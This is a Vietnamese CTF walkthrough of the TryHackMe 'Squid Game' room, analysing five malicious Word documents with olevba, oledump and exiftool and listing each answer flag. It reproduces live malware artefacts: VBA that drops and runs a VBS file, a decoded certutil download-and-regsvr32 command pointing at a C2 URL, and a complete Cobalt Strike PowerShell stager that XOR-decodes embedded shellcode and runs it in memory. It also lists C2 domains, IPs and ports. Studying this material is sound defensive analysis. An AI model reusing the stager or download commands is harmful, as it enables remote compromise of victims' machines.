Link roomm: https://tryhackme.com/room/squidgameroom

Tóm tắt: mặc dùng đã chơi CTF hơn một năm rồi nhưng mà room này đã mở mang cho mình nhiều thứ hơn (ngoài việc dùng olevba vô tội vạ) --> khám phá thêm nhiều thứ mới bên trong các tool của ole vd như là oledump, oletime,....


Atacker 1
===
```
 What is the malicious C2 domain you found in the maldoc where an executable download was attempted? 
```
Xác định trước bằng `olevba` ta có được thông tin như link [tại đây](https://github.com/P5ySm1th/noob-learn-cybersec/blob/main/Tryhackme/Others/%5Bsquidgame_attacker1%5D%20olevba.vbs)
Nhìn sơ qua khi truyền biến các thứ thì có lẽ như là đây một chuỗi truyền biến bình thường không có gì đặc sắc. Chú ý tới phần đoạn code sau đây: 

<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/33e30998-ffd2-45f5-a728-87c36befdae5">
</p>

Đại khái nó như là một hàm dùng để replace `[` thành `A`. Sau khi nhận ra là đổi theo kiểu strings thì dùng `oledump.py` để có thể dump từng string ra. Với câu lệnh sau thì ta bắt gặp thông tin của một đoạn `Shell Script`:

```oledump.py attacker1.doc -s 4 -S``` 

<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/9c36a14e-b1d9-4b5b-a4c5-e7ad2d9f0865">
</p>

Và như đã đề cập ở trên trình chúng ta sẽ cần thay `[` thành `A`. Nhận biết đây Basee64 nên đã mém thẳng vào `cyberchef` và chúng ta có full Script [tại đây](https://github.com/P5ySm1th/noob-learn-cybersec/blob/main/Tryhackme/Others/%5Bsquidgame_attacker1%5D%20powershell.ps1)

<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/04c1a02a-574a-4b76-bca3-61eba88aeb4d">
</p>

Dựa vào đoạn script đó thì ta sẽ trả lời được câu hỏi đó

#### Flag: http://fpetraardella.band/xap_102b-AZ1/704e.php?l=litten4.gas

```
What executable file is the maldoc trying to drop?
```
Dựa vào đoạn script powershell trả lời được luôn đoạn thứ 2

#### Flag: QdZGP.exe

```
In what folder is it dropping the malicious executable? (hint: %Folder%)
```

Tới câu hỏi số 3, khi nhìn đoạn code nó sẽ thực hiện một đoạn là `$path = [System.Environment]::GetFolderPath("CommonApplicationData") + "\\QdZGP.exe";` nếu tra theo đoạn link (này)[https://gist.github.com/DamianSuess/c143ed869e02e002d252056656aeb9bf]
ta sẽ biế được rwawnfg phần `CommonApplicationData` đó chính là `ProgramData`

#### Flag: %ProgramData%


```
Provide the name of the COM object the maldoc is trying to access.
```
Câu này thì mình sử dụng hint thì bảo `Check clsid field` nên mình mang lên mạng `clsid` thì tìm thấy được thông tin như sau: 
<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/339fe144-85fe-463e-aca4-1a0db8a9f94e">
</p>

#### Flag: ShellBrowserWindow

```
Include the malicious IP and the php extension found in the maldoc. (Format: IP/name.php)
```
Câu này thì sử dụng trong đoạn `powershell script` tiếp thì thấy được liền

#### Flag: 176.32.35.16/704e.php

```
Find the phone number in the maldoc. (Answer format: xxx-xxx-xxxx)
```
Tìm trong phần metadata là ra

#### Flag: 213-446-1757


```
Doing some static analysis, provide the type of maldoc this is under the keyword “AutoOpen”.
```
Câu này thì sử dụng olevba để kiểm tra với syntax sau: `olevba attacker1.doc`
<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/88b5ca1f-25b3-4e59-94d6-10163d500d2d">
</p>

Ta thấy rằng khi mở file word lên thì macro tự động chạy. 

#### Flag: Autoexec

```
Provide the subject for this maldoc. (make sure to remove the extra whitespace)
```
Sử dụng `exiftool` tiếp để kiểm tra metadata của file sẽ ra flag

#### Flag: West Virginia  Samanta

```
 Provide the time when this document was last saved. (Format: YEAR-MONTH-DAY XX:XX:XX) 
```
Sử dụng công cụ `oletimes` để xem được thời gian mà document này được chỉnh sửa hoặc cũng dùng `exiftool` vào bên trong phần `modify date` là ra

#### Flag: 2019-02-07 23:45:30


```
Provide the stream number that contains a macro.
```

Để xem stream nào chứa macro thì sử dụng `oledump`. `oledump` sẽ list hết các stream có bên trong file doc. Thằng nào có chữ M là thằng đó là macro
<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/dfe4f1ba-b89e-44a0-b31c-af69b346b891">
</p>

#### Flag: 8

```
Provide the name of the stream that contains a macro.
```
Name of the stream thì dựa vào `oledump` ban nãy là được =))
#### Flag: ThisDocument


Atacker 2
===

```
Provide the streams (numbers) that contain macros. 
```
Sử dụng oledump để check xem `stream` nào có chứa `macro` như những lần trước. Check thì ra kết quả. Có `M` là Macro

#### Flag: 12, 13, 14, 16

```
Provide the size (bytes) of the compiled code for the second stream that contains a macro.
```

Để xem được (size) của stream thì thêm command `-i` vào thì thấy hàng thứ 3 chính là số byte của nó

<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/93c1f33e-a67a-43fa-8ccb-7886171caaa2">
</p>

#### Flag: 13867


```
Provide the largest number of bytes found while analyzing the streams.
```
Để tìm số bytes lớn nhất thì tìm bên trong phần hàng số 2 của hình trên.

#### Flag: 63641


```
Find the command located in the ‘fun’ field ( make sure to reverse the string).
```
Kiểm tra bằng olevba để xem `macro` trong đó, có thể full [tại đây](https://github.com/P5ySm1th/noob-learn-cybersec/blob/main/Tryhackme/Others/%5Bsquidgame_attacker2%5D%20attacker2.vbs)

Ta thấy được biến `fun` được sử dụng với câu lệnh `StrReverse` 

```
Sub eFile()
Dim QQ1 As Object
Set QQ1 = New Form
RO = StrReverse("\ataDmargorP\:C")
ROI = RO + StrReverse("sbv.nip")
ii = StrReverse("")
Ne = StrReverse("IZOIZIMIZI")
WW = QQ1.t2.Caption
MyFile = FreeFile
Open ROI For Output As #MyFile
Print #MyFile, WW
Close #MyFile
fun = Shell(StrReverse("sbv.nip\ataDmargorP\:C exe.tpircsc k/ dmc"), Chr(48))
End
End Sub
```

#### Flag: cmd /k cscript.exe C:\ProgramData\pin.vbs

```
Provide the first domain found in the maldoc.
```
Này mình để cho `olevba` check trước kéo xuống dưới thì thấy được mấy cái url luôn rồi =))) còn không có thì check bên trong các đoạn source code thôi :)

#### Flag: priyacareers.com/u9hDQN9Yy7g/pt.html

```
Provide the second domain found in the maldoc.
```

Thằng này cũng vậy =))) không có khác gì hết
#### Flag: perfectdemos.com/Gv1iNAuMKZ/pt.html

```
Provide the name of the first malicious DLL it retrieves from the C2 server.
```
Câu này thì check `olevba` thì có luôn hẳn nha =))) còn không có thì tự thân vận động check `sourcecode`

#### Flag: www1.dll

```
How many DLLs does the maldoc retrieve from the domains?
```
Cái này thì đếm bên trong `olevba` thì có hẳn luôn =))

#### Flag: 5

```
Provide the path of where the malicious DLLs are getting dropped onto?
```

check vào stream  OLE stream: `'Macros/Form/o'` ta sẽ thấy được nó sử dụng cộng string và sau đó nó load file `dll` chạy ở C:\\ProgramData

#### Flag: C:\ProgramData

```
What program is it using to run DLLs?
```
Vẫn check bên trong đó, thì thấy nó execute `cmd` chạy file `rundll32.exe` để khởi động dll của malware
#### Flag: rundll32.exe 


```
How many seconds does the function in the maldoc sleep for to fully execute the malicious DLLs?
```

Vẫn check hàm đó tiếp ta thấy nó là hàm `loop` để chạy `5 dll`. thì trên đó trước khi execute nó sẽ sleep `1500` ở đây là 1500ms --> convert ra là `15s`

#### Flag: 15


```
Under what stream did the main malicious script use to retrieve DLLs from the C2 domains? (Provide the name of the stream).
```
Như đã nói thì xét function bên trong `olevba` thì ta đã có được kết quả sẵn rồi =))) stream này đây =)) ` OLE stream: Macros/Form/o`

#### Flag: Macros/Form/o


Atacker 3
===
```
 Provide the executable name being downloaded. 
```

Check trước bằng `olevba` thì ra được một hàm autorun sau đây:

<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/387ba96b-e3a8-4931-be2d-418208878e74">
</p>

Nôm na thì có sẽ đặt biến `u = tutil` và sau đó nó gán `cer + <biến u>.exe` biến nó thành `1.exe` thì nếu nhìn bằng mắt thì thấy là có file `1.exe`

#### Flag: 1.exe

```
What program is used to run the executable?
```
Thì như nói ở trên là nó do cái hàm này làm hết

<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/387ba96b-e3a8-4931-be2d-418208878e74">
</p>

#### Flag: certutil.exe

```
Provide the malicious URI included in the maldoc that was used to download the binary (without http/https).
```

Ta thấy có hàm `h` như sau:
```python
Function h(ju)
eR = Split(ju, "%")
For lc = 0 To UBound(eR)
 hh = hh & Chr(eR(lc) Xor 111)
Next lc
h = hh
End Function
```

Nếu khó hiểu thì ta có thể dịch nó sang ngôn ngữ `python` cũng được như sau: 

```python
def h(ju):
  eR = ju.split("%")
  hh = ""
  for lc in range(len(eR)):
    hh += chr(int(eR[lc]) ^ 111)
  return hh
```

Nôm na là nó sẽ tách những letter `%` vào `eR` và sau đó chạy vòng for để `Xor` với 111.  Việc chúng ta cần làm là chạy hmaf để biết nó làm gì. Full source code dưới đây:

```python
def h(ju):
  eR = ju.split("%")
  hh = ""
  for lc in range(len(eR)):
    hh += chr(int(eR[lc]) ^ 111)
  return hh

cipher = "12%2%11%79%64%12%79%77%28%10%27%79%26%82%26%29%3%73%73%12%14%3%3%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%10%23%10%79%64%74%26%74%49%12%49%14%49%12%49%7%49%10%49%79%64%9%49%79%7%27%27%31%85%64%64%87%12%9%14%22%25%65%12%0%2%64%13%0%3%13%64%5%14%10%1%27%65%31%7%31%80%3%82%3%6%26%27%89%65%12%14%13%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%27%2%31%79%73%73%79%12%14%3%3%79%29%10%8%28%25%29%92%93%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%27%2%31%77"
print(h(cipher))
```

ta sẽ ra được đoạn như sau: 
```
cmd /c "set u=url&&call C:\ProgramData\1.exe /%u%^c^a^c^h^e^ /f^ http://8cfayv.com/bolb/jaent.php?l=liut6.cab C:\ProgramData\1.tmp && call regsvr32 C:\ProgramData\1.tmp"
```

Thì ta ra được flag
#### Flag: http://8cfayv.com/bolb/jaent.php?l=liut6.cab


```
What folder does the binary gets dropped in?
```

Thì nhìn vào đoạn code output thì là biết rồi =)) không biết thì dẹp :D 

#### Flag: ProgramData

```
 Which stream executes the binary that was downloaded? 
```
Check kĩ lại đoạn `olevba` thì thấy được rằng `binary` được download trong `VBA MACRO T.bas ` check = `oledump` thì ra được stream đó luôn

<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/b96988b5-05a9-4a3d-a292-d35a30041db8">
</p>

#### Flag: A3


Attacker 4
===
Mình khá là ngu khi phải phân tích khá nhiều bước. Nhưng rồi mình chợt nhận ra là mình ngu thật =)))
Bước đầu phân tích bằng `olevba` thì ra được source code khá là dài. Có thể xem [tại đây]()

Nhìn sơ qua thì khá là dài và khá là rối do chưa được `indent` lại đúng cách. Để `indent` lại cho dễ nhìn thì có thể vòa trang web [này](https://www.vbindent.com/?indent) để có thể `indent` lại cho nhìn rõ hơn.

Sau khi nhìn rõ hơn rồi thì thấy rằng có một số `function` gọi khá là mơ hồ. (rối và vô nghĩa) nên là mình quyết định bỏ từng hàm sang một file khác và bắt đầu phân tích cách thực hiện của chúng như thế nào. ( ở đây mình chỉ phân tích hai function quan trọng là Hextostring và XORI)

```python
Public Function Hextostring(ByVal string1 As String) As String
	Dim tmpString As String
	Dim returnString As String
	Dim index As Long
	For index = 1 To Len(string1) Step 2
		tmpString = Chr$(Val(Chr$(38) & Chr$(72) & Mid$(string1, index, 2)))
		returnString = returnString & tmpString
		Next index
		Hextostring = returnString
		
	End Function
```

Hàm này nhận vào tham số là một `string`, thực hiện vòng `loop`, trong vòng `loop`, `tmpString` nhận vào giá trị `chr(int(hex(string1[index:idex+1])))` (mình không biết giải thích như thế nào nhưng mà ghi vắng tắt vậy ai học python chắc sẽ hiểu) nói nôm  na thì nó sẽ phân string để convert sang một chữ cái rồi cộng vào string return

Tới hàm XORI thì biết chắc chắn là hàm XOR rồi:
```python
Public Function XORI(ByVal string1 As String, ByVal string2 As String) As String
	Dim index As Long
	For index = 1 To Len(string1)
		XORI = XORI & Chr(Asc(Mid(string2, IIf(index Mod Len(string2) <> 0, index Mod Len(string2), Len(string2)), 1)) Xor Asc(Mid(string1, index, 1)))
		Next index
	End Function

```

Hàm này nhận 2 tham số là string1 và string2, sau đó nó thực hiện việc xor giữa string2 và string1 được thực hiện bởi hàm này`	XORI = XORI & Chr(Asc(Mid(string2, IIf(index Mod Len(string2) <> 0, index Mod Len(string2), Len(string2)), 1)) Xor Asc(Mid(string1, index, 1)))`. Nếu vẫn không hiểu hàm này, hàm này có thể viết dưới dạng python như sau: 

```python
if(index % len(string2) != 0):
  XORI += chr(string2[index%len(string2)] ^ string1[index])  
else:
  XORI += chr(string2[len(string2)] ^ string1[index])    
```

Và từ đây chúng ta có thể viết một đoạn script để có thể decode được một đống encode đã cho: 

```python
def Hextostring(string1):
  tmpString = ""
  returnString = ""
  index = 0
  while index <= len(string1) - 1:
    tmpString = chr(int(string1[index : index + 2], 16))
    returnString += tmpString
    index += 2
  return returnString

def XORI(string1, string2):
  xored_string = ""
  index = 0
  while index <= len(string1) - 1:
    xored_char = chr(ord(string2[index % len(string2)]) ^ ord(string1[index]))
    xored_string += xored_char
    index += 1
  return xored_string
```
Nếu muốn đọc hiểu hơn về `visual basic` thì có thể xem thêm tại đường link này: 
- https://learn.microsoft.com/en-us/dotnet/visual-basic/language-reference/operators/comparison-operators

Sau khi filter và bỏ những function dư thừa thì ta đã có một đoạn code cuối cùng [tại đây]()

Và trả lời các câu hỏi thôi =)) (dựa vào đoạn code mà trả lời đi, tới đây là xong hết rồi :)))) ) (2h sáng hơn và đã quá lười để viết tiếp :) )

```
Provide the first decoded string found in this maldoc.
```
#### Flag: MSXML2.XMLHTTP
```
Provide the name of the binary being dropped.
```
#### Flag: DYIATHUQLCW.exe
```
Provide the folder where the binary is being dropped to.
```
#### Flag: TEMP
```
Provide the name of the second binary.
```
#### Flag: bin.exe
```
Provide the full URI from which the second binary was downloaded (exclude http/https).
```
#### Flag: gv-roth.de/js/bin.exe


Attacker 5
===
```
What is the caption you found in the maldoc?
```
Check bằng `olevba` trước (có thể xem [tại đây]()) nhưng vẫn không thấy gì, nên bắt đầu sử dụng `oledump`, check từng stream một sẽ có đáp án

#### Flag: CobaltStrikeIsEverywhere

```
What is the XOR decimal value found in the decoded-base64 script?
```
Nếu xét trên script của `olevba` thì cũng chả có gì, nên là bây giờ check tiếp từng stream một và có một stream là `base64 encode`, decode ra được kết quả sau đây: 


<p align ="center">
  <img src="https://github.com/P5ySm1th/noob-learn-cybersec/assets/100250271/7bfa351d-37d9-4a48-bac8-31127dbe8a6a">
</p>


Đây là đoạn base64 được encode bởi gzip, sử dụng google và search `decompress base64 gzip online` vào trang đầu tiên để decode `base64` và chúng ta thu được một đoạn code powershell. Đoạn code này khá quen vì đã gặp ở một giải khác. Có thể xem phân tích [tại đây](https://github.com/bananNat/FUSec2023#misc-document-trick)

```powershell
Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSByckuzPCMjcHNLdKq85dz2yFN4EvFxSyMhQ6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMcElucSP+sQy3QZ6caZyDPAAbKKHkwo8rpqq6kCYXyN9IP0+eVsZ4Rw99v716BXp8CyVfV41jsFco/hc/4tB6shBcGAUikQ2ThLag7XmzI3ZQRlEOYkRGTVcZA25MWUpPT0IMFw0TAwtATE5TQldKQU9GGANucGpmAxsNExgDdEpNR0xUUANtdwMWDRIYA3dRSkdGTVcMFw0TGAMNbWZ3A2BvcQMRDRMNFhMUERQKLikjYfGBTVSEQE/m/5df5/fpCjFv4/AmAnva1i+w9bmm/76gBU3gUrWNEqwUDynyTlxf7l95KviaPh6R9jbEVpv2FM0QMpSm8v7RafNgBBWMPhjf2BCxziGm5ons/AMwe+yqnMCHFubG65SrMf9AcD7Oaji2SmdUmWXrN05+fgHkQOJ3tzya0EUEZof+sfEqjL55Xf/eaJFjXB1XOVOA9qQo6vhMrOj4HkBuhuOw+ncvfvWR0fMabYHPhfH41OFoliMuF4+BBZc1S3wwN4NgZCNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEhQVDRITEA0WFQ0bGiMjIyMi')

for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 35
}

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
$var_runme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
	IEX $DoIt
}
```
và chúng ta ra dược đáp án câu hỏi này
#### Flag: 35


```
Provide the C2 IP address of the Cobalt Strike server. 
```
Nếu phân tích đoạn powershell kia thì ta thấy được nó sẽ cần decode base64 và xor với 35, lên `cyberchef` decode và ra được kết quả. Có thể xem tại đường link [này](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'Decimal','string':'35'%7D,'Standard',false)&input=Mzh1cUl5TWpRNnJHRXZGSHFIRVRxSEV2cUhFM3FGRUxMSlJwQlJMY0V1T1BIMEpmSVE4RDR1d3VJdVRCMDNGMHFIRXpxR0VmSXZPb1kxdW00MWRwSXZOenFHczdxSHNESXZEQUgycW9GNmdpOVJMY0V1T1A0dXd1SXVRYncxYlhJRjdiR0Y0SFZzRjdxSHNISXZCRnFDOW9xSHMvSXZDb0o2Z2k4NnBuQndkNGVFSjZlWExjdzN0OGVhZ3h5S1YrUzAxR1Z5TkxWRXBOU25kTGIxUUZKTnoyRXR4MGRIUjBkRXNaZFZxRTNQYktweU1qSTNnUzZuSnlTU0J5Y2t1elBDTWpjSE5MZEtxODVkejJ5Rk40RXZGeFN5TWhRNmR4Y1hGd2NYTkx5SFlOR056MnF1V2c0SE1TM0hSMFNkeHdkVXNPSlR0WTNQYW00eXluNENJakl4TGNwdFZYSjZyYXlDcExpZWJCZnR6MnF1SkxaZ0o5RXR6MkV0eDBTU1J5ZFhOTGxIVERLTnoybkNNTUl5TWE1RmVVRXR6S3NpSWpJOHJxSWlNank2amMzTndNY0VsdWNTUCtzUXkzUVo2Y2FaeURQQUFiS0tIa3dvOHJwcXE2a0NZWHlOOUlQMCtlVnNaNFJ3OTl2NzE2QlhwOEN5VmZWNDFqc0Zjby9oYy80dEI2c2hCY0dBVWlrUTJUaExhZzdYbXpJM1pRUmxFT1lrUkdUVmNaQTI1TVdVcFBUMElNRncwVEF3dEFURTVUUWxkS1FVOUdHQU51Y0dwbUF4c05FeGdEZEVwTlIweFVVQU50ZHdNV0RSSVlBM2RSU2tkR1RWY01GdzBUR0FNTmJXWjNBMkJ2Y1FNUkRSTU5GaE1VRVJRS0xpa2pZZkdCVFZTRVFFL20vNWRmNS9mcENqRnY0L0FtQW52YTFpK3c5Ym1tLzc2Z0JVM2dVcldORXF3VUR5bnlUbHhmN2w5NUt2aWFQaDZSOWpiRVZwdjJGTTBRTXBTbTh2N1JhZk5nQkJXTVBoamYyQkN4emlHbTVvbnMvQU13ZSt5cW5NQ0hGdWJHNjVTck1mOUFjRDdPYWppMlNtZFVtV1hyTjA1K2ZnSGtRT0ozdHp5YTBFVUVab2Yrc2ZFcWpMNTVYZi9lYUpGalhCMVhPVk9BOXFRbzZ2aE1yT2o0SGtCdWh1T3crbmN2ZnZXUjBmTWFiWUhQaGZINDFPRm9saU11RjQrQkJaYzFTM3d3TjROZ1pDTkwwNWFCZGR6MlNXTkxJek1qSTBzakkyTWpkRXQ3aDNERzNQYXdtaU1qSXlNaStuSndxc1IwU3lNREl5TndkVXN4dGFyQjNQYW00MWZscUNRaTRLYmpWc1o3NE11SzN0emNFaFFWRFJJVEVBMFdGUTBiR2lNakl5TWk)


#### Flag: 176.103.56.89
```
Provide the full user-agent found.
```
Dựa vào câu trên luôn
#### Flag: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)

```
Provide the path value for the Cobalt Strike shellcode.
```
Sử dụng tool `scdbgc` để giả lập lại usermode là có kết quả hết.
#### Flag: /SjMR

```
Provide the port number of the Cobalt Strike C2 Server.
```
Sử dụng tool `scdbgc` để giả lập lại usermode là có kết quả hết.
#### Flag: 8080

```
Provide the first two APIs found.
```

#### Flag: LoadLibraryA. InternetOpenA
